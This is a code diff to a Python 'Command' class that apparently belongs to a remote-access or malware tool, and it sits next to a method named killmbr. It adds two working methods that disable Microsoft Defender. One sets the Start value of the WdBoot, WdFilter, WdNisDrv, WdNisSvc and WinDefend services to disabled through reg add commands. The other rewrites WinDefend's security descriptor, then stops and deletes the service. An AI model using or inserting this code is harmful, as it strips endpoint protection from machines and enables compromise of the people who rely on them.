@@ -936,7 +936,7 @@ class Command:
             return 0, '[-] Error: {}'.format(exception)
 
     @staticmethod
-    def killwd():
+    def killwd_sandbox():
         try:
             if Helper.get_integrity_level() != 'System':
                 return 0, '[-] System permission required'
@@ -964,6 +964,38 @@ class Command:
             return 1, '[+] Success'
         except Exception as exception:
             return 0, '[-] Error: {}'.format(exception)
+
+    @staticmethod
+    def killwd_registry():
+        try:
+            cmd_list = [
+                r'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f',
+                r'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f',
+                r'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f',
+                r'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f',
+                r'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f']
+            result = ''
+            for cmd in cmd_list:
+                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                result += str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
+            return 1, result
+        except Exception as exception:
+            return 0, '[-] Error: ' + str(exception)
+
+    @staticmethod
+    def killwd_service():
+        try:
+            cmd_list = [
+                r'sc sdset WinDefend O:SYG:SYD:AI(A;CIID;KR;;;BU)(A;CIID;KA;;;BA)(A;CIID;KA;;;SY)(A;CIIOID;KA;;;CO)(A;CIID;KR;;;AC)(A;CIID;KR;;;S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)',
+                r'sc stop WinDefend',
+                r'sc delete WinDefend']
+            result = ''
+            for cmd in cmd_list:
+                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                result += str(p.stdout.read() + p.stderr.read(), locale.getdefaultlocale()[1])
+            return 1, result
+        except Exception as exception:
+            return 0, '[-] Error: ' + str(exception)
 
     @staticmethod
     def killmbr():
